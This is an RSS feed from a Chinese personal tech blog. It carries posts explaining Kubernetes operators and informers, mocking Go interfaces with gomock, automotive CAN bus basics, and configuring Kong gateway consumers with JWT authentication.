<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on shank</title>
		<link>https://shankisme.com/posts/</link>
		<description>Recent content in Posts on shank</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en-us</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
		<lastBuildDate>Tue, 07 Dec 2021 20:13:53 +0800</lastBuildDate>
		<atom:link href="https://shankisme.com/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>聊一聊kubernetes operator</title>
			<link>https://shankisme.com/posts/%E8%81%8A%E4%B8%80%E8%81%8Akubernetes-operator/</link>
			<pubDate>Tue, 07 Dec 2021 20:13:53 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/%E8%81%8A%E4%B8%80%E8%81%8Akubernetes-operator/</guid>
			<description>前言 微服务兴起，许多业务被部署在了k8s上，大多数业务开发人员日常接触到的基本是build-in资源(ingress service deployment replicaset pod hpa)，因此会认为kubernetes(以下简称k8s)是一个设计优秀的paas平台，在k8s中创建资源的人员会被称为yaml工程师。
这么说显得k8s很无聊, 资源只是对象状态的描述，实际执行动作的是k8s的组件(kubelet kube-proxy等)，可以说k8s的执行能力足够强大，能在存储、网络、容器上玩出花，你完全可以组织自己的资源格式(crd)，利用k8s的能力做自己想做的事，k8s本质上是带有强大执行力的分布式资源管理平台，这种动词-名词分离的解释应该能让你更好地理解k8s。
得益于强大的插件机制，k8s还能自定义资源(crd/cr)，自定义controller，自定义api server, 自定义admission webhook，他们让你能有效组合k8s的执行力，做一些有逻辑的事。当下最流行的莫过于玩crd+controller了。
为了让看官更好的了解operator（controller + crd + cr），咱们从k8s两大设计思想：声明式API、控制循环说起。
声明式API 声明式与之相对的是命令式, 命令式顾名思义，让目标按指定命令做事；而声明式则是提供目标一个期望状态，让目标朝期望状态去变更。
看得出来，命令式够简洁，但要花费巨大代价保证命令执行拥有原子性幂等性。
提供期望状态看似冗余，但只要期望状态能被执行者获取到，执行者就能不断尝试着去达成期望状态，过程简单。
而API嘛，指的是k8s apiserver提供的RESTful http接口，创建资源接口需要接收完整的资源期望状态定义, 期望状态指的就是spec中的描述，与之对应的实际状态由执行者（controller）记录在status中。
这也是为啥我们在用kubectl查看资源信息的时候后出现额外的status字段，这实际上是执行者帮我们记录的，专业点的叫法是规约(spec) - 状态(status)分离。比如pod, 除了元信息外，状态从spec和status字段开始展开。
type Pod struct { metav1.TypeMeta `json:&amp;#34;,inline&amp;#34;` metav1.ObjectMeta `json:&amp;#34;metadata,omitempty&amp;#34; protobuf:&amp;#34;bytes,1,opt,name=metadata&amp;#34;` Spec PodSpec `json:&amp;#34;spec,omitempty&amp;#34; protobuf:&amp;#34;bytes,2,opt,name=spec&amp;#34;` Status PodStatus `json:&amp;#34;status,omitempty&amp;#34; protobuf:&amp;#34;bytes,3,opt,name=status&amp;#34;` } 控制循环（control loop） 资源的理想状态存储在k8s的apiserver中，为了让资源由实际状态向期望状态靠拢, 执行者需要监听资源期望状态的增删改事件，这些事件会触发执行者以定时重复执行方式调用对应的handler处理事件, 直到满足期望状态为止，之后执行者再把操作结果记录到实际状态中。
 执行者 我们知道，kubelet是k8s自带组件，主要功能通过监听pod期望状态变化事件并做一些事确保本地的pod处于期望状态。
kube-proxy同样也会处理pod的增删改事件，它不断地刷新本机linux网络设备的配置，来确保pod网络通畅。
还有我们常用的deployment、cronJob、statefulset等，它们拥有自己的controller做控制循环，这些controller 运行在组件controller-manager内。
然而不像上面提到的处理k8s原生资源的执行者，这次我们聊的operator,由crd(custom resource definition)、cr(custom resource)、controller组成。
crd用来描述你想创建的资源应该有哪些字段，cr是crd的具体化实现，与对象，对象实例之间区别类似。
我们自己实现的controller控制的目标就是cr, 它的实现原理等同controller-manager中的原生controller：
  依靠informer的ListAndWatch方法将指定资源的状态缓存在内存中，并不断监控状态变化</description>
			<content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>微服务兴起，许多业务被部署在了k8s上，大多数业务开发人员日常接触到的基本是build-in资源(ingress service deployment replicaset pod hpa)，因此会认为kubernetes(以下简称k8s)是一个设计优秀的paas平台，在k8s中创建资源的人员会被称为<del>yaml工程师</del>。</p>
<p>这么说显得k8s很无聊, 资源只是对象状态的描述，实际执行动作的是k8s的组件(kubelet kube-proxy等)，可以说k8s的执行能力足够强大，能在存储、网络、容器上玩出花，你完全可以组织自己的资源格式(crd)，利用k8s的能力做自己想做的事，k8s本质上是带有强大执行力的分布式资源管理平台，这种动词-名词分离的解释应该能让你更好地理解k8s。</p>
<p>得益于强大的插件机制，k8s还能自定义资源(crd/cr)，自定义controller，自定义api server, 自定义admission webhook，他们让你能有效组合k8s的执行力，做一些有逻辑的事。当下最流行的莫过于玩crd+controller了。</p>
<p>为了让看官更好的了解operator（controller + crd + cr），咱们从k8s两大设计思想：<code>声明式API</code>、<code>控制循环</code>说起。</p>
<h2 id="声明式api">声明式API</h2>
<p>声明式与之相对的是命令式, 命令式顾名思义，让目标按指定命令做事；而声明式则是提供目标一个期望状态，让目标朝期望状态去变更。</p>
<p>看得出来，命令式够简洁，但要花费巨大代价保证命令执行拥有原子性幂等性。</p>
<p>提供期望状态看似冗余，但只要期望状态能被执行者获取到，执行者就能不断尝试着去达成期望状态，过程简单。</p>
<p>而API嘛，指的是k8s apiserver提供的RESTful http接口，创建资源接口需要接收完整的资源期望状态定义, 期望状态指的就是spec中的描述，与之对应的实际状态由执行者（controller）记录在status中。</p>
<p>这也是为啥我们在用kubectl查看资源信息的时候后出现额外的status字段，这实际上是执行者帮我们记录的，专业点的叫法是<code>规约(spec) - 状态(status)分离</code>。比如pod, 除了元信息外，状态从spec和status字段开始展开。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang"><span class="kd">type</span> <span class="nx">Pod</span> <span class="kd">struct</span> <span class="p">{</span>
  <span class="nx">metav1</span><span class="p">.</span><span class="nx">TypeMeta</span> <span class="s">`json:&#34;,inline&#34;`</span>

  <span class="nx">metav1</span><span class="p">.</span><span class="nx">ObjectMeta</span> <span class="s">`json:&#34;metadata,omitempty&#34; protobuf:&#34;bytes,1,opt,name=metadata&#34;`</span>

  <span class="nx">Spec</span> <span class="nx">PodSpec</span> <span class="s">`json:&#34;spec,omitempty&#34; protobuf:&#34;bytes,2,opt,name=spec&#34;`</span>

  <span class="nx">Status</span> <span class="nx">PodStatus</span> <span class="s">`json:&#34;status,omitempty&#34; protobuf:&#34;bytes,3,opt,name=status&#34;`</span>
<span class="p">}</span>
</code></pre></div><h2 id="控制循环control-loop">控制循环（control loop）</h2>
<p>资源的理想状态存储在k8s的apiserver中，为了让资源由实际状态向期望状态靠拢, 执行者需要监听资源期望状态的增删改事件，这些事件会触发执行者以定时重复执行方式调用对应的handler处理事件, 直到满足期望状态为止，之后执行者再把操作结果记录到实际状态中。</p>
<figure><img src="/img/%e8%81%8a%e8%81%8aoperator/controlloop2.png"
         alt="image" width="300px"/>
</figure>

<h2 id="执行者">执行者</h2>
<p>我们知道，kubelet是k8s自带组件，主要功能通过监听pod期望状态变化事件并做一些事确保本地的pod处于期望状态。</p>
<p>kube-proxy同样也会处理pod的增删改事件，它不断地刷新本机linux网络设备的配置，来确保pod网络通畅。</p>
<p>还有我们常用的deployment、cronJob、statefulset等，它们拥有自己的controller做控制循环，这些controller 运行在组件controller-manager内。</p>
<p>然而不像上面提到的处理k8s原生资源的执行者，这次我们聊的operator,由crd(custom resource definition)、cr(custom resource)、controller组成。</p>
<p>crd用来描述你想创建的资源应该有哪些字段，cr是crd的具体化实现，与对象，对象实例之间区别类似。</p>
<p>我们自己实现的controller控制的目标就是cr, 它的实现原理等同controller-manager中的原生controller：</p>
<ul>
<li>
<p>依靠informer的ListAndWatch方法将指定资源的状态缓存在内存中，并不断监控状态变化</p>
</li>
<li>
<p>reconcile方法中的业务逻辑会根据资源的期望状态，对外部世界作出改变，如果处理失败，就重新入队，按某种规则到某个时间继续进入reconcile, 直到处理完成。</p>
</li>
<li>
<p>也可以设置resync period, 全量资源定时入队处理。</p>
<figure><img src="/img/%e8%81%8a%e8%81%8aoperator/controller.png"
         alt="image"/><figcaption>
            <p>figure-normal (without any classes)</p>
        </figcaption>
</figure>

</li>
</ul>
<h3 id="一些细节">一些细节</h3>
<h4 id="时间换空间">时间换空间</h4>
<p>api server是k8s的核心组件，总不能仅仅因为controller要频繁获取资源状态，就让它受高qps压榨延迟变高吧，因此controller在设计时就采用的空间换时间的策略: 把目标资源状态存在内存里，informer再和api server建立http长连接watch事件变化，这样一来，controller在读取资源状态时直接从内存读就行了，变更资源状态时再通过client向api server发送请求。</p>
<p>cache部分由informer实现，这里小提以下它的设计(图在下方)：</p>
<ul>
<li><code>Reflector</code>: list &amp; watch 资源，写入FIFO</li>
<li><code>FIFO queue</code>: 入队事件动作和对应资源,pop出的数据同时交给Indexer和外部的eventHandler</li>
<li><code>Indexer(local store)</code>: 基于内存的并发安全存储，存储FIFO pop的数据</li>
</ul>
<h4 id="解耦">解耦</h4>
<p>通常，informer接收到事件后不会直接执行eventHandler中的业务逻辑，而是将数据丢进queue中，由多个并行的worker处理，妥妥的生产者-消费者模型，避免informer在调用handler时间过长被拖死。</p>
<p><strong>那不加work queue解耦会有什么后果？</strong></p>
<p>通常我们用的是sharedInformer，进程里有多个controller时，用sharedInformerFactory创建出来的Informer只有独立的listener, 其余的reflector和indexer是共享的，原因很简单，多个重复reflector会增加api server负担。而不加work queue时，上一个addHandler还在处理中，listener就将下一个数据写入channel(listener用的无缓冲区channel)，而distribute方法又是range listeners的，直接会导致之后的listener无法写入数据，FIFO queue无法被consume, 底层的slice越来越大，直到OOM。</p>
<figure><img src="/img/%e8%81%8a%e8%81%8aoperator/informer2.png"
         alt="image" width="600px"/>
</figure>

<h2 id="框架生成工具">框架生成工具</h2>
<ul>
<li>code-generator: 底层方式，基本没封装，能帮你了解operator的原始设计，感兴趣可以看下我的demo。</li>
<li>kube-builder: 封装好，基本只要关注reconcile的业务逻辑实现, 这我也有demo。</li>
<li>operator-sdk: 基于controller-runtime, 和kube-builder大同小异, 未来可能合并。</li>
</ul>
<h2 id="测试框架">测试框架</h2>
<p>kubebuilder-generatored operator 有自己内嵌的测试框架ginkgo&amp;gomega，这套框架会依赖本地的api-server或者依赖本地etcd二进制文件再创建出来一个新的api server，用作controller-runtime client的请求目标，测试过程按着行为驱动开发（BDD）的方式走，写起来很省心。</p>
]]></content>
		</item>
		
		<item>
			<title>go-mock初探</title>
			<link>https://shankisme.com/posts/go-mock%E5%88%9D%E6%8E%A2/</link>
			<pubDate>Fri, 22 Jan 2021 01:41:04 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/go-mock%E5%88%9D%E6%8E%A2/</guid>
			<description>go mock 用于虚拟接口。一般只要提供interface，无论有没有实现该interface的类型，gomock会根据接口的输入输出提供一个实现了该interface的mock实例，同时在自定义mock实例的输入输出前，可以根据期望过滤输入，产生想要的输出或调用某些函数。说的很晦涩，看点代码吧。
目录结构：
trymock/ /db |--db.go |--db_test.go /mock |--db_mock.go // generated by mockgen //db.go type DB interface { Get(key string) (int, error) } func GetFromDB(db DB, key string) int { if value, err := db.Get(key); err == nil { return value } return -1 } gomock中，DB实例只能通过传参传入生成mock文件
mockgen -source=db.go -destination=db_mock.go -package=mock gomock生成的db_mock.go如下
//db_mock.go // Code generated by MockGen. DO NOT EDIT. // Source: db.go  // Package mock_db is a generated GoMock package.</description>
			<content type="html"><![CDATA[<p>go mock 用于虚拟接口。一般只要提供interface，无论有没有实现该interface的类型，gomock会根据接口的输入输出提供一个实现了该interface的mock实例，同时在自定义mock实例的输入输出前，可以根据期望过滤输入，产生想要的输出或调用某些函数。说的很晦涩，看点代码吧。</p>
<p>目录结构：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">trymock/
    /db
    <span class="p">|</span>--db.go
    <span class="p">|</span>--db_test.go
    /mock
      <span class="p">|</span>--db_mock.go // generated by mockgen
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">//db.go
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">DB</span> <span class="kd">interface</span> <span class="p">{</span>
    <span class="nf">Get</span><span class="p">(</span><span class="nx">key</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">GetFromDB</span><span class="p">(</span><span class="nx">db</span> <span class="nx">DB</span><span class="p">,</span> <span class="nx">key</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
    <span class="k">if</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span> <span class="nx">err</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">value</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
<span class="p">}</span>
</code></pre></div><p>gomock中，DB实例只能通过传参传入生成mock文件</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">mockgen -source<span class="o">=</span>db.go -destination<span class="o">=</span>db_mock.go -package<span class="o">=</span>mock
</code></pre></div><p>gomock生成的db_mock.go如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">//db_mock.go
</span><span class="c1">// Code generated by MockGen. DO NOT EDIT.
</span><span class="c1">// Source: db.go
</span><span class="c1"></span>
<span class="c1">// Package mock_db is a generated GoMock package.
</span><span class="c1"></span><span class="kn">package</span> <span class="nx">mock</span>

<span class="kn">import</span> <span class="p">(</span>
    <span class="nx">gomock</span> <span class="s">&#34;github.com/golang/mock/gomock&#34;</span>
    <span class="nx">reflect</span> <span class="s">&#34;reflect&#34;</span>
<span class="p">)</span>

<span class="c1">// MockDB is a mock of DB interface
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">MockDB</span> <span class="kd">struct</span> <span class="p">{</span>
    <span class="nx">ctrl</span>     <span class="o">*</span><span class="nx">gomock</span><span class="p">.</span><span class="nx">Controller</span>
    <span class="nx">recorder</span> <span class="o">*</span><span class="nx">MockDBMockRecorder</span>
<span class="p">}</span>

<span class="c1">// MockDBMockRecorder is the mock recorder for MockDB
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">MockDBMockRecorder</span> <span class="kd">struct</span> <span class="p">{</span>
    <span class="nx">mock</span> <span class="o">*</span><span class="nx">MockDB</span>
<span class="p">}</span>

<span class="c1">// NewMockDB creates a new mock instance
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">NewMockDB</span><span class="p">(</span><span class="nx">ctrl</span> <span class="o">*</span><span class="nx">gomock</span><span class="p">.</span><span class="nx">Controller</span><span class="p">)</span> <span class="o">*</span><span class="nx">MockDB</span> <span class="p">{</span>
    <span class="nx">mock</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">MockDB</span><span class="p">{</span><span class="nx">ctrl</span><span class="p">:</span> <span class="nx">ctrl</span><span class="p">}</span>
    <span class="nx">mock</span><span class="p">.</span><span class="nx">recorder</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">MockDBMockRecorder</span><span class="p">{</span><span class="nx">mock</span><span class="p">}</span>
    <span class="k">return</span> <span class="nx">mock</span>
<span class="p">}</span>

<span class="c1">// EXPECT returns an object that allows the caller to indicate expected use
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">m</span> <span class="o">*</span><span class="nx">MockDB</span><span class="p">)</span> <span class="nf">EXPECT</span><span class="p">()</span> <span class="o">*</span><span class="nx">MockDBMockRecorder</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">m</span><span class="p">.</span><span class="nx">recorder</span>
<span class="p">}</span>

<span class="c1">// Get mocks base method
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">m</span> <span class="o">*</span><span class="nx">MockDB</span><span class="p">)</span> <span class="nf">Get</span><span class="p">(</span><span class="nx">key</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">m</span><span class="p">.</span><span class="nx">ctrl</span><span class="p">.</span><span class="nx">T</span><span class="p">.</span><span class="nf">Helper</span><span class="p">()</span>
    <span class="nx">ret</span> <span class="o">:=</span> <span class="nx">m</span><span class="p">.</span><span class="nx">ctrl</span><span class="p">.</span><span class="nf">Call</span><span class="p">(</span><span class="nx">m</span><span class="p">,</span> <span class="s">&#34;Get&#34;</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span>
    <span class="nx">ret0</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ret</span><span class="p">[</span><span class="mi">0</span><span class="p">].(</span><span class="kt">int</span><span class="p">)</span>
    <span class="nx">ret1</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ret</span><span class="p">[</span><span class="mi">1</span><span class="p">].(</span><span class="kt">error</span><span class="p">)</span>
    <span class="k">return</span> <span class="nx">ret0</span><span class="p">,</span> <span class="nx">ret1</span>
<span class="p">}</span>

<span class="c1">// Get indicates an expected call of Get
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">mr</span> <span class="o">*</span><span class="nx">MockDBMockRecorder</span><span class="p">)</span> <span class="nf">Get</span><span class="p">(</span><span class="nx">key</span> <span class="kd">interface</span><span class="p">{})</span> <span class="o">*</span><span class="nx">gomock</span><span class="p">.</span><span class="nx">Call</span> <span class="p">{</span>
    <span class="nx">mr</span><span class="p">.</span><span class="nx">mock</span><span class="p">.</span><span class="nx">ctrl</span><span class="p">.</span><span class="nx">T</span><span class="p">.</span><span class="nf">Helper</span><span class="p">()</span>
    <span class="k">return</span> <span class="nx">mr</span><span class="p">.</span><span class="nx">mock</span><span class="p">.</span><span class="nx">ctrl</span><span class="p">.</span><span class="nf">RecordCallWithMethodType</span><span class="p">(</span><span class="nx">mr</span><span class="p">.</span><span class="nx">mock</span><span class="p">,</span> <span class="s">&#34;Get&#34;</span><span class="p">,</span> <span class="nx">reflect</span><span class="p">.</span><span class="nf">TypeOf</span><span class="p">((</span><span class="o">*</span><span class="nx">MockDB</span><span class="p">)(</span><span class="kc">nil</span><span class="p">).</span><span class="nx">Get</span><span class="p">),</span> <span class="nx">key</span><span class="p">)</span>
<span class="p">}</span>

</code></pre></div><p>测试</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// db_test.go
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">TestGetFromDB</span><span class="p">(</span><span class="nx">t</span> <span class="o">*</span><span class="nx">testing</span><span class="p">.</span><span class="nx">T</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">ctrl</span> <span class="o">:=</span> <span class="nx">gomock</span><span class="p">.</span><span class="nf">NewController</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span>
    <span class="k">defer</span> <span class="nx">ctrl</span><span class="p">.</span><span class="nf">Finish</span><span class="p">()</span> <span class="c1">// 断言 DB.Get() 方法是否被调用
</span><span class="c1"></span>
    <span class="nx">m</span> <span class="o">:=</span> <span class="nx">mock</span><span class="p">.</span><span class="nf">NewMockDB</span><span class="p">(</span><span class="nx">ctrl</span><span class="p">)</span>
    <span class="nx">m</span><span class="p">.</span><span class="nf">EXPECT</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="nx">gomock</span><span class="p">.</span><span class="nf">Eq</span><span class="p">(</span><span class="s">&#34;Tom&#34;</span><span class="p">)).</span><span class="nf">Return</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;not exist&#34;</span><span class="p">))</span>

    <span class="k">if</span> <span class="nx">v</span> <span class="o">:=</span> <span class="nf">GetFromDB</span><span class="p">(</span><span class="nx">m</span><span class="p">,</span> <span class="s">&#34;Tom&#34;</span><span class="p">);</span> <span class="nx">v</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">{</span>
        <span class="nx">t</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="s">&#34;expected -1, but got&#34;</span><span class="p">,</span> <span class="nx">v</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div><p>go mock有个限制，生成的mock_db实例和真正的db实例是两个不一样的实例（废话），因此在写测试时需要使用mock实例，而开发/生产环境中需要用真正的db实例，导致在设计GetFromDB一类的方法时，需要将db实例作为参数传入方法中，这样有碍结构设计的灵活性。 当然有方法能越过这层阻碍重点</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">//db.go
</span><span class="c1"></span>
<span class="kd">func</span> <span class="nf">GetFromDB</span><span class="p">(</span><span class="nx">key</span> <span class="kt">string</span><span class="p">){</span>
    <span class="nx">db</span> <span class="o">:=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">getDBClient</span><span class="p">()</span>
    <span class="nx">db</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span>
    <span class="o">...</span>
<span class="p">}</span>
<span class="kd">var</span>  <span class="nx">mockDBClient</span> <span class="nx">DB</span>

<span class="kd">func</span> <span class="nf">getDBClient</span><span class="p">(){</span>
  <span class="k">if</span> <span class="nx">mockDBClient</span> <span class="o">!=</span> <span class="kc">nil</span><span class="p">{</span>
    <span class="k">return</span> <span class="nx">mockDBClient</span>
  <span class="p">}</span>
  <span class="c1">// 懒加载获得真实的DB连接并返回
</span><span class="c1"></span>  <span class="k">return</span> <span class="nx">actual</span><span class="p">.</span><span class="nf">GetDBClient</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">newMockDBClient</span><span class="p">(</span><span class="nx">t</span> <span class="o">*</span><span class="nx">testing</span><span class="p">.</span><span class="nx">T</span><span class="p">){</span>
  <span class="nx">gomock</span><span class="p">.</span><span class="nf">NewController</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span>
  <span class="nx">m</span> <span class="o">:=</span> <span class="nx">mock</span><span class="p">.</span><span class="nf">NewMockDB</span><span class="p">(</span><span class="nx">ctrl</span><span class="p">)</span>
  <span class="nx">mockDBClient</span> <span class="p">=</span> <span class="nx">m</span>
<span class="p">}</span>
</code></pre></div><p>以上将获取真实DBClient之前加上了一层判断，判断是否创建了mockDB，创建了则返回mockDB, 没创建就懒加载DB连接。 gomock另一个缺陷是他不支持自动生成响应，也就是说不能配置mock server，或许gomock是专为测试设计的，server这一块用于前端调用模拟，一般也是给个接口就能创建，应该有其他技术覆盖了这一块。</p>
]]></content>
		</item>
		
		<item>
			<title>汽车CAN总线复习笔记</title>
			<link>https://shankisme.com/posts/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%B1%BD%E8%BD%A6can%E6%80%BB%E7%BA%BF%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
			<pubDate>Sat, 16 Jan 2021 20:45:02 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%B1%BD%E8%BD%A6can%E6%80%BB%E7%BA%BF%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
			<description>CAN总线使用总线技术，取代了传统的点对点布线方式连接汽车电子控制单元（ECU）, 解决了传统布线方式中线束多，布线难，成本高等问题。
 figure-normal (without any classes)
  CAN总线标准 CAN总线标准规定了物理层和数据链路层（参考计算机网络OSI七层网络模型），应用层需要用户自定义，不同的CAN标准中，对物理层的要求不同，对数据链路层的要求是相同的。
CAN网络物理层 连接在CAN总线上的设备叫做节点设备（CAN Node），CAN网络的拓扑一般为线型。线束最常用的是双绞线，线上传输为对称的差分电平信号。</description>
			<content type="html"><![CDATA[<p>CAN总线使用总线技术，取代了传统的点对点布线方式连接汽车电子控制单元（ECU）, 解决了传统布线方式中线束多，布线难，成本高等问题。</p>
<p><img src="/img/autocar/1.png" alt="点对点"></p>
<p><img src="/img/autocar/2.png" alt="总线"></p>
<figure><img src="/img/autocar/3.jpg"
         alt="image"/><figcaption>
            <p>figure-normal (without any classes)</p>
        </figcaption>
</figure>

<h1 id="can总线标准">CAN总线标准</h1>
<p>CAN总线标准规定了物理层和数据链路层（参考计算机网络OSI七层网络模型），应用层需要用户自定义，不同的CAN标准中，对物理层的要求不同，对数据链路层的要求是相同的。</p>
<p><img src="/img/autocar/4.png" alt="总线"></p>
<p><img src="/img/autocar/5.png" alt="总线"></p>
<h1 id="can网络物理层">CAN网络物理层</h1>
<p>连接在CAN总线上的设备叫做节点设备（CAN Node），CAN网络的拓扑一般为线型。线束最常用的是双绞线，线上传输为对称的差分电平信号。</p>
<p><img src="/img/autocar/6.jpg" alt="总线"></p>
]]></content>
		</item>
		
		<item>
			<title>kong网关consumer service route plugin 理解与实践</title>
			<link>https://shankisme.com/posts/kong%E7%BD%91%E5%85%B3consumer-service-route-plugin-%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E8%B7%B5/</link>
			<pubDate>Sun, 22 Nov 2020 13:40:56 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/kong%E7%BD%91%E5%85%B3consumer-service-route-plugin-%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E8%B7%B5/</guid>
			<description>近几天在学习api网关kong，发现中文网基本没人发表关于kong的consumer、plugin、route、service的进一步探索和使用相关文章，只是分开描述了单独的概念和做简单配置，因此为了补全这个缺失，我尽量详细记录这几天的摸索历程，以及对这些概念的理解和实践。
传送门：
kong网关中文文档
kong官网
kong官方文档
前言 近几天在学习api网关kong，发现中文网基本没人发表关于kong的consumer、plugin、route、service的进一步探索和使用相关文章，只是分开描述了单独的概念和做简单配置，因此为了补全这个缺失，我尽量详细记录这几天的摸索历程，以及对这些概念的理解和实践。
理论 Consumer  The Consumer object represents a consumer - or a user - of an API. You can either rely on Kong as the primary datastore, or you can map the consumer list with your database to keep consistency between Kong and your existing primary datastore.
 （官方原文解释中的消费者和数据库的映射这里暂时不涉及）
consumer直译消费者。它是个抽象概念，代表一类事物。例如你可以创建一组consumer代表api版本号v1、v2、v3， 也可以代表请求来源类型，来自客户端请求可标记为android/iOS， web前端请求标记为web frontend，IoT设备请求标记为IoT device。
Kong所在的架构好比一家公司，kong consumer 就代表公司员工种类，普通员工、主管、经理、老板等。当然，标记这些人员需要工牌，工牌上具有员工认证信息，无工牌社会人员无法进入。
请求未认证情况下不为consumer， 只会根据请求的customIP标记，因此请求被kong标记为consumer前需要进行认证。
kong提供了多种认证方式：BASIC AUTH、API KEYS、HMAC、OAUTH2、JWT
他们适合的使用场景都不同，按需设置，我这里需要用kong搭建分布式场景应用，因此选择JWT</description>
			<content type="html"><![CDATA[<p>近几天在学习api网关kong，发现中文网基本没人发表关于kong的consumer、plugin、route、service的进一步探索和使用相关文章，只是分开描述了单独的概念和做简单配置，因此为了补全这个缺失，我尽量详细记录这几天的摸索历程，以及对这些概念的理解和实践。</p>
<p>传送门：</p>
<p><a href="https://github.com/qianyugang/kong-docs-cn">kong网关中文文档</a></p>
<p><a href="https://konghq.com/">kong官网</a></p>
<p><a href="https://docs.konghq.com/">kong官方文档</a></p>
<h2 id="前言">前言</h2>
<p>近几天在学习api网关kong，发现中文网基本没人发表关于kong的consumer、plugin、route、service的进一步探索和使用相关文章，只是分开描述了单独的概念和做简单配置，因此为了补全这个缺失，我尽量详细记录这几天的摸索历程，以及对这些概念的理解和实践。</p>
<h2 id="理论">理论</h2>
<h2 id="consumer">Consumer</h2>
<blockquote>
<p>The Consumer object represents a consumer - or a user - of an API. You can either rely on Kong as the primary datastore, or you can map the consumer list with your database to keep consistency between Kong and your existing primary datastore.</p>
</blockquote>
<p>（官方原文解释中的消费者和数据库的映射这里暂时不涉及）</p>
<p>consumer直译消费者。它是个抽象概念，代表一类事物。例如你可以创建一组consumer代表api版本号v1、v2、v3， 也可以代表请求来源类型，来自客户端请求可标记为android/iOS， web前端请求标记为web frontend，IoT设备请求标记为IoT device。</p>
<p>Kong所在的架构好比一家公司，kong consumer 就代表公司员工种类，普通员工、主管、经理、老板等。当然，标记这些人员需要工牌，工牌上具有员工认证信息，无工牌社会人员无法进入。</p>
<p>请求未认证情况下不为consumer， 只会根据请求的customIP标记，因此请求被kong标记为consumer前需要进行认证。</p>
<p>kong提供了多种认证方式：BASIC AUTH、API KEYS、HMAC、OAUTH2、JWT</p>
<p>他们适合的使用场景都不同，按需设置，我这里需要用kong搭建分布式场景应用，因此选择JWT</p>
<p>（这里使用kong图形界面KONGA实践）</p>
<figure><img src="/img/kong/1.png"
         alt="image"/>
</figure>

<figure><img src="/img/kong/2.png"
         alt="image"/>
</figure>

<p>JWT验证需要key识别用户，secret为kong保存的私钥，algorithm为最终签名算法。</p>
<p>JWT最终的格式简化为三段式： base64「algorithm」. base64「payload」. base64「最终签名」 。</p>
<p>payload中存放key以及一些不敏感信息 username, expire time等，最终签名是使用第一段的hash算法对第二段的payload哈希后的base64值。</p>
<p>JWT token 可以在JWT 官网去生成，当然最好是使用JWT库封装接口传参生成JWT token。</p>
